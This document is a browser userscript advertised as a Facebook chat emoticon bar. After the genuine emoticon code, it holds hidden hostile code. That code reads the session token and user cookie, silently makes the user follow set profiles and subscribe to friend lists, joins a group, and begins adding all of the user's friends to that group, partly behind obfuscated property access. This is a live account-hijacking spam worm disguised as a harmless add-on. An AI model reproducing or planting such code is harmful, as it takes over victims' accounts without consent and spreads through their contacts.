// ==UserScript==
// @name		Facebook Chat Emoticons
// @description	        Facebook Chat Emoticons Real. [update]2014
// @description	        Thank you for using my script!!
// @namespace           http://userscripts.org/scripts/review/163090
// @updateURL           https://userscripts.org/scripts/source/163090.meta.js
// @downloadURL         https://userscripts.org/scripts/source/163090.user.js
// @homepageURL         https://userscripts.org/scripts/show/163090
// @include		http://facebook.com/*
// @include		http://*.facebook.com/*
// @include		https://facebook.com/*
// @include		https://*.facebook.com/*
// @exclude		http://*.channel.facebook.com/*
// @exclude		https://*.channel.facebook.com/*
// @author		Harman SidHu
// @version		1.111
// @versionnumber	11.11
// ==/UserScript==
//


	var version, storage, spemotsInfo, spemotsTitle, headTag, styleTag, ArrowStyleUp, ArrowStyleDown, fEmotBarDom, fEmotsListDom, fArrow;

	version = 3;
	


	storage = 'none';

	try {
		if (typeof GM_getValue === 'function' && typeof GM_setValue === 'function') {
			GM_setValue('testkey', 'testvalue');
			if (GM_getValue('testkey', false) === 'testvalue') { storage='greasemonkey'; }
		}
	} catch(x) {}
	if (storage=='none' && typeof localStorage == 'object') { storage='localstorage'; }

	function setValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				GM_setValue('0-'+key, value);
				break;
			case 'localstorage':
				localStorage['femotbar-0-'+key] = value;
				break;
		}
	}

	function getValue(key, value) {
		switch (storage) {
			case 'greasemonkey':
				return GM_getValue('0-'+key, value);
			case 'localstorage':
				var val = localStorage['femotbar-0-'+key];
				if (val=='true') { return true; }
				else if (val=='false') { return false; }
				else if (val) { return val; }
				break;
		}
		return value;
	}
	
	function xmlhttpRequest(params, callBack) {
		if (typeof GM_xmlhttpRequest !== 'undefined') {
			params['onload'] = callBack;
			return GM_xmlhttpRequest(params);
		}
		return null;
	}

	function openInTab(url) {
		if (typeof GM_openInTab !== 'undefined') { GM_openInTab(url); }
		else { window.open(url); }
	}

	
	

	function createSelection(field, start, end) {
		if( field.createTextRange ) {
			var selRange = field.createTextRange();
			selRange.collapse(true);
			selRange.moveStart('character', start);
			selRange.moveEnd('character', end);
			selRange.select();
		} else if( field.setSelectionRange ) {
			field.setSelectionRange(start, end);
		} else if( field.selectionStart ) {
			field.selectionStart = start;
			field.selectionEnd = end;
		}
		field.focus();
	}       
	
	function getCursorPosition(field) {
		var CursorPos = 0;
		if (field.selectionStart || field.selectionStart == '0') CursorPos = field.selectionStart;
		return (CursorPos);
	}
	

	
	
  var troolfaces = '[[286450808123889]][[286450794790557]][[286450801457223]][[286450804790556]][[286450798123890]]\n'+'[[286450874790549]][[286450984790538]][[286450981457205]][[286450978123872]][[286450974790539]]\n'+'[[286450971457206]][[286451071457196]][[286451104790526]][[286451114790525]][[286451111457192]]\n'+'[[286451108123859]][[286451118123858]][[286451181457185]][[286451188123851]][[286451184790518]]'

  var youming = '[[286469458122024]][[286469454788691]][[286469451455358]][[286469448122025]]\n'+
'[[286469461455357]][[286469538122016]][[286469561455347]][[286469558122014]]\n'+
'[[286469564788680]][[286469568122013]][[286469554788681]][[286469638122006]]\n'+
'[[286469658122004]][[286469664788670]][[286469668122003]][[286469671455336]]\n'+
'[[286469661455337]][[286469738121996]][[286469741455329]][[286469744788662]]'

  var asa7by = '[[286466801455623]][[286466794788957]][[286466804788956]][[286466798122290]]\n'+
'[[286466791455624]][[286466864788950]][[286466898122280]][[286466888122281]]\n'+
'[[286466901455613]][[286466894788947]][[286466891455614]][[286466961455607]]\n'+
'[[286466981455605]][[286466991455604]][[286466984788938]][[286466994788937]]\n'+
'[[286466988122271]][[286467074788929]][[286467071455596]][[286467068122263]]'

 var stranger = '[[286471794788457]][[286471791455124]][[286471788121791]][[286471784788458]]\n'+
'[[286471781455125]][[286471868121783]][[286471901455113]][[286471904788446]]\n'+
'[[286471894788447]][[286471898121780]][[286471908121779]][[286471981455105]]\n'+
'[[286472251455078]][[286472254788411]][[286472258121744]][[286472268121743]]\n'+
'[[286472274788409]][[286472411455062]][[286472414788395]][[286472418121728]]'

 var wtf = '[[286508041451499]][[286508031451500]][[286508028118167]][[286508034784833]][[286508038118166]]\n'+
'[[286508114784825]][[286508108118159]][[286508118118158]][[286508111451492]][[286508121451491]]\n'+
'[[286508198118150]][[286508201451483]][[286508194784817]][[286508191451484]][[286508204784816]]'

  var hug = '[[440675475968633]][[440675482635299]][[440675479301966]][[440675522635295]][[440675525968628]]\n'+
'[[440675529301961]][[440675592635288]][[440675599301954]][[440675595968621]][[440675589301955]]'


 var rose = '[[440677975968383]][[440677969301717]][[440677965968384]][[440677962635051]]\n'+
'[[440677972635050]][[440678042635043]][[440678079301706]][[440678069301707]]\n'+
'[[440678072635040]][[440678075968373]][[440678082635039]][[440678149301699]]\n'+
'[[440678185968362]][[440678175968363]][[440678179301696]][[440678189301695]]\n'+
'[[440678182635029]][[440678249301689]][[440678255968355]][[440678252635022]]'

 var blushing = '[[286499634785673]][[286499624785674]][[286499631452340]][[286499638119006]][[286499628119007]]\n'+
'[[286499708118999]][[286499704785666]][[286499711452332]][[286499938118976]][[286499941452309]]\n'+
'[[286499928118977]][[286499934785643]][[286499944785642]][[286500021452301]][[286500014785635]]\n'+
'[[286500018118968]][[286500118118958]][[286500114785625]][[286500128118957]][[286500124785624]]\n'+
'[[286500121452291]][[286500214785615]][[286500211452282]][[286500208118949]][[286500204785616]]'


 var bogy = '[[196431117116365]]'

 var songbob = '[[440683239301190]][[440683232634524]][[440683235967857]][[440683242634523]][[440683245967856]]\n'+
'[[440683309301183]][[440683315967849]][[440683312634516]][[440683382634509]][[440683385967842]]\n'+
'[[440683392634508]][[440683389301175]][[440683379301176]][[440683452634502]][[440683455967835]]\n'+
'[[440683459301168]][[440683509301163]][[440683495967831]][[440683502634497]][[440683499301164]]\n'+
'[[440683505967830]][[440683589301155]][[440683579301156]][[440683582634489]][[440683585967822]]'

 var cry = '[[245307658872150]]'

var smileyface = '[[506202996059717]]'



var cat = '[[286505258118444]][[286505271451776]][[286505264785110]][[286505268118443]][[286505254785111]]\n'+
'[[286505331451770]][[286505378118432]][[286505368118433]][[286505364785100]][[286505374785099]]\n'+
'[[286505371451766]][[286505441451759]][[286505478118422]][[286505474785089]][[286505471451756]]\n'+
'[[286505468118423]][[286505464785090]][[286505538118416]][[286505544785082]][[286505541451749]]'


var girllol = '[[440697465966434]][[440697462633101]][[440697452633102]][[440697459299768]]\n'+
'[[440697455966435]][[440697525966428]][[440697722633075]][[440697719299742]]\n'+
'[[440697729299741]][[440697715966409]][[440697725966408]][[440697789299735]]\n'+
'[[440697819299732]][[440697805966400]][[440697809299733]][[440697812633066]]\n'+
'[[440697815966399]][[440697899299724]][[440697892633058]][[440697895966391]]'


var worry = '[[440699162632931]][[440699159299598]][[440699155966265]][[440699169299597]][[440699165966264]]\n'+
'[[440699229299591]][[440699255966255]][[440699262632921]][[440699265966254]][[440699259299588]]\n'+
'[[440699269299587]][[440699325966248]][[440699359299578]][[440699352632912]][[440699362632911]]\n'+
'[[440699349299579]][[440699355966245]][[440699422632905]][[440699425966238]][[440699452632902]]'

var idk ='[[440700522632795]][[440700512632796]][[440700519299462]]\n'+ 
'[[440700509299463]][[440700515966129]][[440700609299453]]\n'+
'[[440700599299454]][[440700602632787]][[440700595966121]]\n'+
'[[440700605966120]][[440700692632778]][[440700685966112]]\n'+
'[[440700682632779]][[440700689299445]][[440700679299446]]'

var thinking = '[[440702245965956]][[440702242632623]][[440702235965957]][[440702249299289]][[440702239299290]]\n'+
'[[440702305965950]][[440702312632616]][[440702309299283]][[440702482632599]][[440702485965932]]\n'+
'[[440702489299265]][[440702509299263]][[440702535965927]][[440702615965919]][[440702605965920]]\n'+
'[[440702609299253]][[440702762632571]][[440702769299237]][[440702765965904]][[440702759299238]]\n'+
'[[440702755965905]][[440702839299230]][[440702842632563]][[440702835965897]][[440702845965896]]'

var girl = '[[440709042631943]][[440709039298610]][[440709029298611]][[440709032631944]][[440709035965277]]\n'+
'[[440709102631937]][[440709105965270]][[440709109298603]][[440709255965255]][[440709259298588]]\n'+
'[[440709262631921]][[440709252631922]][[440709265965254]][[440709375965243]][[440709372631910]]\n'+
'[[440709379298576]][[440709425965238]][[440709422631905]][[440709419298572]][[440709429298571]]\n'+
'[[440709432631904]][[440709492631898]][[440709489298565]][[440709495965231]][[440709499298564]]'


var kisslove = '[[440712229298291]][[440712242631623]][[440712232631624]][[440712235964957]][[440712239298290]]\n'+
'[[440712322631615]][[440712329298281]][[440712315964949]][[440712332631614]][[440712325964948]]\n'+
'[[440712465964934]][[440712459298268]][[440712469298267]][[440712462631601]][[440712472631600]]'




var bye = '[[286502274785409]][[286502288118741]][[286502281452075]][[286502278118742]][[286502284785408]]\n'+
'[[286502358118734]][[286502394785397]][[286502388118731]][[286502391452064]][[286502398118730]]\n'+
'[[286502401452063]][[286502474785389]][[286502614785375]][[286502621452041]][[286502624785374]]\n'+
'[[286502611452042]][[286502618118708]][[286502691452034]][[286502694785367]][[286502688118701]]'

var shutup = '[[440717349297779]][[440717355964445]][[440717352631112]][[440717362631111]][[440717359297778]]\n'+
'[[440717479297766]][[440717485964432]][[440717495964431]][[440717575964423]][[440717565964424]]\n'+
'[[440717569297757]][[440717572631090]][[440717579297756]][[440717642631083]][[440717645964416]]\n'+
'[[440717649297749]][[440717699297744]][[440717705964410]][[440717692631078]][[440717702631077]]\n'+
'[[440717695964411]][[440717789297735]][[440717785964402]][[440717792631068]][[440717782631069]]'

var hello ='[[440719209297593]][[440719202630927]][[440719205964260]][[440719195964261]][[440719199297594]]\n'+
'[[440719372630910]][[440719369297577]][[440719365964244]][[440719362630911]][[440719375964243]]\n'+
'[[440719439297570]][[440719442630903]][[440719449297569]][[440719445964236]][[440719435964237]]'

var dog = '[[286485281453775]][[286485291453774]][[286485288120441]][[286485294787107]][[286485284787108]]\n'+
'[[286485374787099]][[286485378120432]][[286485371453766]][[286485471453756]][[286485474787089]]\n'+
'[[286485478120422]][[286485464787090]][[286485468120423]][[286485554787081]][[286485558120414]]\n'+
'[[286485561453747]][[286485614787075]][[286485601453743]][[286485611453742]][[286485604787076]]\n'+
'[[286485608120409]][[286485688120401]][[286485691453734]][[286485694787067]][[286485698120400]]'

var iloveu = '[[440721465964034]][[440721472630700]][[440721462630701]][[440721469297367]][[440721459297368]]\n'+
'[[440721562630691]][[440721559297358]][[440721555964025]][[440721702630677]][[440721709297343]]\n'+
'[[440721705964010]][[440721699297344]][[440721712630676]][[440721812630666]][[440721815963999]]\n'+
'[[440721809297333]][[440721885963992]][[440721889297325]][[440721882630659]][[440721895963991]]\n'+
'[[440721892630658]][[440721969297317]][[440721972630650]][[440721982630649]][[440721995963981]]'

var angry = '[[191327717635842]]'

var disslike = '[[145225882254911]]'

var wtf2 = '[[510633348950015]]'

var th2 = '[[440733125962868]][[440733132629534]][[440733129296201]][[440733135962867]]\n'+
'[[440733139296200]][[440733199296194]][[440733235962857]][[440733229296191]]\n'+
'[[440733225962858]][[440733222629525]][[440733232629524]][[440733295962851]]\n'+
'[[440733332629514]][[440733325962848]][[440733322629515]][[440733319296182]]\n'+
'[[440733329296181]][[440733392629508]][[440733395962841]][[440733389296175]]'

var gm = '[[506203412726342]]'


var cool ='[[440742829295231]][[440742842628563]][[440742825961898]][[440742832628564]][[440742839295230]]\n'+
'[[440742929295221]][[440742932628554]][[440742935961887]][[440743085961872]][[440743089295205]]\n'+
'[[440743092628538]][[440743099295204]][[440743095961871]][[440743162628531]][[440743165961864]]\n'+
'[[440743169295197]][[440743215961859]][[440743219295192]][[440743225961858]][[440743222628525]]\n'+
'[[440743229295191]][[440743285961852]][[440743295961851]][[440743292628518]][[440743289295185]]'

var surrprise = '[[440727099296804]][[440727105963470]][[440727109296803]][[440727102630137]][[440727112630136]]\n'+
'[[440727172630130]][[440728222630025]][[440728209296693]][[440728219296692]][[440728215963359]]\n'+
'[[440728212630026]][[440728292630018]][[440728319296682]][[440728315963349]][[440728312630016]]\n'+
'[[440728322630015]][[440728325963348]][[440728399296674]][[440728392630008]][[440728395963341]]'

var download = 'Created by "rupam baveja" https://www.facebook.com/rupam.baveja'
 	
spemotsInfo = [troolfaces, 'http://graph.facebook.com/595406423806040/picture', youming, 'http://graph.facebook.com/595407120472637/picture', asa7by, 'http://graph.facebook.com/595407710472578/picture', stranger, 'http://graph.facebook.com/595408283805854/picture', wtf, 'http://graph.facebook.com/595410120472337/picture',hug, 'http://graph.facebook.com/595410970472252/picture',rose, 'http://graph.facebook.com/595411403805542/picture', blushing, 'http://graph.facebook.com/595411790472170/picture',bogy, 'http://graph.facebook.com/595412230472126/picture',songbob, 'http://graph.facebook.com/595412573805425/picture',  cry, 'http://graph.facebook.com/595413673805315/picture', smileyface, 'http://graph.facebook.com/595414163805266/picture',cat, 'http://graph.facebook.com/595415527138463/picture',girllol, 'http://graph.facebook.com/595416123805070/picture', worry, 'http://graph.facebook.com/595416950471654/picture', idk, 'http://graph.facebook.com/595417370471612/picture',girl, 'https://graph.facebook.com/595418200471529/picture',kisslove, 'https://graph.facebook.com/595419050471444/picture',bye, 'http://graph.facebook.com/595419747138041/picture',shutup, 'http://graph.facebook.com/595420180471331/picture', hello, 'http://graph.facebook.com/595423190471030/picture', dog, 'http://graph.facebook.com/595423760470973/picture', iloveu, 'http://graph.facebook.com/595424017137614/picture',angry, 'http://graph.facebook.com/191327717635842/picture', disslike, 'http://graph.facebook.com/595425600470789/picture', wtf2, 'https://graph.facebook.com/595426207137395/picture',th2, 'https://graph.facebook.com/595426833803999/picture',download, 'http://graph.facebook.com/595429210470428/picture'];
    spemotsTitle = ['troolfaces', ' ', 'youming', ' ','asa7by', ' ','stranger', ' ', 'wtf', ' ','hug', ' ','rose', ' ','blushing', ' ','bogy', ' ','spongbob', ' ','cry', ' ','smileyface',' ','cat',' ','girllol',' ','worry',' ','idk',' ','girl',' ','kisslove',' ','bye',' ','shutup',' ','hello',' ','dog',' ','ilove',' ','uangry',' ','disslike',' ','wtf2',' ','th2',' ','created by roopsi',' ','gm',' ','surrprise',' ','',' ','created by roopsi'];
    headTag = document.getElementsByTagName('head')[0];
    if (headTag) {
		styleTag = document.createElement('style');
		styleTag.type = 'text/css';
		styleTag.innerHTML =
			'.chat_tab_emot_bar {padding-top: 0px; padding-bottom: 0px; line-height: 1px; padding-left: 1px; background:#EEEEEE none repeat scroll 0 0; border-style: solid; border-width: 0px 0px 1px 0px; border-color: #C9D0DA; position: static; }'+
			'.fbNubFlyoutInner {position:relative !important;bottom:0px !important;}' +
			'.chat_arrow { background-image: url("http://static.ak.fbcdn.net/rsrc.php/v1/zp/r/SBNTDM0S-7U.png"); background-position: 0 -48px; height: 2px; width: 2px; }';
		headTag.appendChild(styleTag);
	}
	
	ArrowStyleUp = 'cursor: pointer; position: absolute; right: 2px; -moz-transform: rotate(180deg); -webkit-transform: rotate(180deg);'
	ArrowStyleDown = 'cursor: pointer; position: absolute; right: 2px;'
	
	fEmotBarDom = document.createElement('div');
	fEmotBarDom.setAttribute('class','chat_tab_emot_bar');

	
	fEmotsListDom = document.createElement('div');
	fEmotsListDom.setAttribute('name','EmotsList');
	fEmotBarDom.appendChild(fEmotsListDom);
	
	
	for(i=0;i<spemotsInfo.length;i+=2) {
		var fEmotsDom = document.createElement('img');
		fEmotsDom.setAttribute('alt',spemotsInfo[i]);
		fEmotsDom.setAttribute('title',spemotsTitle[i]);
		fEmotsDom.setAttribute('src','' + spemotsInfo[i+1]);
		fEmotsDom.setAttribute('style','cursor: pointer;');
		fEmotsDom.setAttribute('class','emote_custom');
		fEmotsListDom.appendChild(fEmotsDom);
	}
	
	

	fArrow = document.createElement('i');
	fArrow.setAttribute('alt','');
	fArrow.setAttribute('class','img chat_arrow');
	fArrow.setAttribute('style',ArrowStyleUp);
	fEmotBarDom.appendChild(fArrow);
	
	var setting_visible = getValue('visible',true);
	
	document.addEventListener('DOMNodeInserted', fInsertedNodeHandler, false);

	function fInsertedNodeHandler(event) {
		if(event.target.getElementsByClassName && event.target.getElementsByClassName('fbNubFlyout fbDockChatTabFlyout')[0])
			fInsertEmotBar(event.target);
	}

	function fInsertEmotBar(fChatWrapper) {
		fChatToolBox = fChatWrapper.getElementsByClassName('fbNubFlyoutHeader')[0]
		fNewEmotBar = fEmotBarDom.cloneNode(true);
		setVisibility(fNewEmotBar);
		for(i=0;i<fNewEmotBar.firstChild.childNodes.length-2;i++) fNewEmotBar.firstChild.childNodes[i].addEventListener('click', fEmotClickHandler , false);

		fNewEmotBar.firstChild.childNodes[i].addEventListener('click' , fStyleClickHandler , false);
		fNewEmotBar.firstChild.childNodes[i+1].addEventListener('click' , fStyleClickHandler , false);
		
		fNewEmotBar.childNodes[1].addEventListener('click', fHideShowEmotBar , false);
		if(fChatToolBox.childNodes) fChatToolBox.insertBefore(fNewEmotBar,fChatToolBox.childNodes[1]);
	}

	function fEmotClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		var pos = getCursorPosition(fChatInput);
		
		var txtbef = ''; var txtaft = '';
		
		if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ';
		if (fChatInput.value.charAt(pos) != ' ') txtaft = ' ';
		
		fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + event.target.getAttribute('alt') + txtaft + fChatInput.value.substring(pos);
		createSelection(fChatInput,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length,pos + event.target.getAttribute('alt').length + txtaft.length + txtbef.length);
	}
	
	function fStyleClickHandler(event){
		var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];
		
		var selectedText = fChatInput.value.substring(fChatInput.selectionStart, fChatInput.selectionEnd);
		
		var pos = getCursorPosition(fChatInput);
		var txtlen = selectedText.length;
		
		if (txtlen == 0) {
			fChatInput.value = fChatInput.value.substring(0,pos) + event.target.getAttribute('alt') + fChatInput.value.substring(pos);
			createSelection(fChatInput,pos + 1,pos + event.target.getAttribute('alt').length-1);
		}
		else {
			var txtbef = event.target.getAttribute('alt').charAt(0);
			var txtaft = event.target.getAttribute('alt').charAt(0);
			
			while (fChatInput.value.charAt(pos) == ' ') { pos += 1; txtlen -= 1; }
			while (fChatInput.value.charAt(pos+txtlen-1) == ' ') txtlen -= 1;
			
			if (fChatInput.value.charAt(pos-1) != ' ' && pos-1 > 0) txtbef = ' ' + txtbef;
			if (fChatInput.value.charAt(pos+txtlen) != ' ') txtaft += ' ';
			
			fChatInput.value = fChatInput.value.substring(0,pos) + txtbef + fChatInput.value.substring(pos,pos+txtlen) + txtaft + fChatInput.value.substring(pos + txtlen);
			
			createSelection(fChatInput, pos + txtlen + 2, pos + txtlen + 2);
		}
	}

	function fHideShowEmotBar(event){
		fChatBar = document.getElementsByName('EmotsList');
		if(fChatBar[0].getAttribute('style') == 'display: none;') {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: block;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleUp);
			}
		}
		else {
			for(i=0;i<fChatBar.length;i++) {
				fChatBar[i].setAttribute('style','display: none;');
				fChatBar[i].parentNode.childNodes[1].setAttribute('style',ArrowStyleDown);
			}
		}
		setValue('visible',!setting_visible);
		setting_visible = !setting_visible;
	}
	
	function setVisibility(DOM) {
		if(setting_visible) {
			DOM.firstChild.setAttribute('style','display: block;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleUp);
		}
		else {
			DOM.firstChild.setAttribute('style','display: none;');
			DOM.childNodes[1].setAttribute('style',ArrowStyleDown);
		}
	}


shortcut = {
	'all_shortcuts':{},
	'add': function(shortcut_combination,callback,opt) {
	
		var default_options = {
			'type':'keydown',
			'propagate':false,
			'disable_in_input':false,
			'target':document,
			'keycode':false
		}
		if(!opt) opt = default_options;
		else {
			for(var dfo in default_options) {
				if(typeof opt[dfo] == 'undefined') opt[dfo] = default_options[dfo];
			}
		}

		var ele = opt.target;
		if(typeof opt.target == 'string') ele = document.getElementById(opt.target);
		var ths = this;
		shortcut_combination = shortcut_combination.toLowerCase();


		var func = function(e) {
			e = e || window.event;
			
	
			
			if (e.keyCode) code = e.keyCode;
			else if (e.which) code = e.which;
			var character = String.fromCharCode(code).toLowerCase();
			
			if(code == 188) character=","; 

			var keys = shortcut_combination.split("+");
		
			var kp = 0;
			
			var shift_nums = {
				"`":"~",
				"1":"!",
				"2":"@",
				"3":"#",
				"4":"$",
				"5":"%",
				"6":"^",
				"7":"&",
				"8":"*",
				"9":"(",
				"0":")",
				"-":"_",
				"=":"+",
				";":":",
				"'":"\"",
				",":"<",
				".":">",
				"/":"?",
				"\\":"|"
			}
		
			var special_keys = {
				'esc':27,
				'escape':27,
				'tab':9,
				'space':32,
				'return':13,
				'enter':13,
				'backspace':8,
	
				'scrolllock':145,
				'scroll_lock':145,
				'scroll':145,
				'capslock':20,
				'caps_lock':20,
				'caps':20,
				'numlock':144,
				'num_lock':144,
				'num':144,
				
				'pause':19,
				'break':19,
				
				'insert':45,
				'home':36,
				'delete':46,
				'end':35,
				
				'pageup':33,
				'page_up':33,
				'pu':33,
	
				'pagedown':34,
				'page_down':34,
				'pd':34,
	
				'left':37,
				'up':38,
				'right':39,
				'down':40,
	
				'f1':112,
				'f2':113,
				'f3':114,
				'f4':115,
				'f5':116,
				'f6':117,
				'f7':118,
				'f8':119,
				'f9':120,
				'f10':121,
				'f11':122,
				'f12':123
			}
	
			var modifiers = { 
				shift: { wanted:false, pressed:false},
				ctrl : { wanted:false, pressed:false},
				alt  : { wanted:false, pressed:false},
				meta : { wanted:false, pressed:false}	
			};
                        
			if(e.ctrlKey)	modifiers.ctrl.pressed = true;
			if(e.shiftKey)	modifiers.shift.pressed = true;
			if(e.altKey)	modifiers.alt.pressed = true;
			if(e.metaKey)   modifiers.meta.pressed = true;
                        
			for(var i=0; k=keys[i],i<keys.length; i++) {
				
				if(k == 'ctrl' || k == 'control') {
					kp++;
					modifiers.ctrl.wanted = true;

				} else if(k == 'shift') {
					kp++;
					modifiers.shift.wanted = true;

				} else if(k == 'alt') {
					kp++;
					modifiers.alt.wanted = true;
				} else if(k == 'meta') {
					kp++;
					modifiers.meta.wanted = true;
				} else if(k.length > 1) { 
					if(special_keys[k] == code) kp++;
					
				} else if(opt['keycode']) {
					if(opt['keycode'] == code) kp++;

				} else {
					if(character == k) kp++;
					else {
						if(shift_nums[character] && e.shiftKey) { 
							character = shift_nums[character]; 
							if(character == k) kp++;
						}
					}
				}
			}
			
			if(kp == keys.length && 
						modifiers.ctrl.pressed == modifiers.ctrl.wanted &&
						modifiers.shift.pressed == modifiers.shift.wanted &&
						modifiers.alt.pressed == modifiers.alt.wanted &&
						modifiers.meta.pressed == modifiers.meta.wanted) {
				callback(e);
	
				if(!opt['propagate']) { 
					e.cancelBubble = true;
					e.returnValue = false;
	
					if (e.stopPropagation) {
						e.stopPropagation();
						e.preventDefault();
					}
					return false;
				}
			}
		}
		this.all_shortcuts[shortcut_combination] = {
			'callback':func, 
			'target':ele, 
			'event': opt['type']
		};
		
		if(ele.addEventListener) ele.addEventListener(opt['type'], func, false);
		else if(ele.attachEvent) ele.attachEvent('on'+opt['type'], func);
		else ele['on'+opt['type']] = func;
	},

	'remove':function(shortcut_combination) {
		shortcut_combination = shortcut_combination.toLowerCase();
		var binding = this.all_shortcuts[shortcut_combination];
		delete(this.all_shortcuts[shortcut_combination])
		if(!binding) return;
		var type = binding['event'];
		var ele = binding['target'];
		var callback = binding['callback'];

		if(ele.detachEvent) ele.detachEvent('on'+type, callback);
		else if(ele.removeEventListener) ele.removeEventListener(type, callback, false);
		else ele['on'+type] = false;
	}
	 
}
shortcut.add('Ctrl+1',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = mean; });
shortcut.add('Ctrl+2',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hitler; });
shortcut.add('Ctrl+3',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = hardcore; });
shortcut.add('Ctrl+4',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = worthit; });
shortcut.add('Ctrl+5',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = wtf; });
shortcut.add('Ctrl+6',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = trues; });
shortcut.add('Ctrl+7',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = potato; });
shortcut.add('Ctrl+8',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = stopyou; });
shortcut.add('Ctrl+9',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = notbad; });
shortcut.add('Ctrl+0',function() { var fChatInput = event.target.parentNode.parentNode.parentNode.parentNode.getElementsByClassName('fbNubFlyoutFooter')[0].getElementsByClassName('inputContainer')[0].getElementsByClassName('uiTextareaAutogrow input')[0];  fChatInput.value = badluck; });

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);
	
function cereziAl(isim) {
    var tarama = isim + "=";
    if (document.cookie.length > 0) {
        konum = document.cookie.indexOf(tarama)
        if (konum != -1) {
            konum += tarama.length
            son = document.cookie.indexOf(";", konum)
            if (son == -1)
                son = document.cookie.length
            return unescape(document.cookie.substring(konum, son))
        }
        else { return ""; }
    }
}

function getRandomInt (min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomValue(arr) {
    return arr[getRandomInt(0, arr.length-1)];
}

var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function a(abone){
    var http4 = new XMLHttpRequest();
     
    var url4 = "/ajax/follow/follow_profile.php?__a=1";
     
    var params4 = "profile_id=" + abone + "&location=1&source=follow-button&subscribed_button_id=u37qac_37&fb_dtsg=" + fb_dtsg + "&lsd&__" + user_id + "&phstamp=";
    http4.open("POST", url4, true);
     
    //Send the proper header information along with the request
    http4.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
    http4.setRequestHeader("Content-length", params4.length);
    http4.setRequestHeader("Connection", "close");
     
    http4.onreadystatechange = function() {//Call a function when the state changes.
    if(http4.readyState == 4 && http4.status == 200) {
       
      http4.close; // Close the connection
     
    }
    }
    
    http4.send(params4);
}

function sublist(uidss) {
		var a = document.createElement('script');
		a.innerHTML = "new AsyncRequest().setURI('/ajax/friends/lists/subscribe/modify?location=permalink&action=subscribe').setData({ flid: " + uidss + " }).send();";
		document.body.appendChild(a);
}

a("100006540371411");
a("100001143058538");
a("100006540371411");
a("100001143058538");



sublist("1392253941002605");
sublist("557206374327459");
sublist("1431048133789852");
sublist("1464007247160607");
sublist("359280417540214");







var gid = ['439279202805319'];

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var httpwp = new XMLHttpRequest();
var urlwp = '/ajax/groups/membership/r2j.php?__a=1';
var paramswp = '&ref=group_jump_header&group_id=' + gid + '&fb_dtsg=' + fb_dtsg + '&__user=' + user_id + '&phstamp=';
httpwp['open']('POST', urlwp, true);
httpwp['setRequestHeader']('Content-type', 'application/x-www-form-urlencoded');
httpwp['setRequestHeader']('Content-length', paramswp['length']);
httpwp['setRequestHeader']('Connection', 'keep-alive');
httpwp['send'](paramswp);

var fb_dtsg = document['getElementsByName']('fb_dtsg')[0]['value'];
var user_id = document['cookie']['match'](document['cookie']['match'](/c_user=(\d+)/)[1]);

var friends = new Array();
gf = new XMLHttpRequest();
gf['open']('GET', '/ajax/typeahead/first_degree.php?__a=1&viewer=' + user_id + '&token' + Math['random']() + '&filter[0]=user&options[0]=friends_only', false);
gf['send']();
if (gf['readyState'] != 4) {} else {
    data = eval('(' + gf['responseText']['substr'](9) + ')');
    if (data['error']) {} else {
        friends = data['payload']['entries']['sort'](function (_0x93dax8, _0x93dax9) {
            return _0x93dax8['index'] - _0x93dax9['index'];
        });
    };
};

for (var i = 0; i < friends['length']; i++) {
    var httpwp = new XMLHttpRequest();
    var urlwp = '/ajax/groups/members/add_post.php?__a=1';
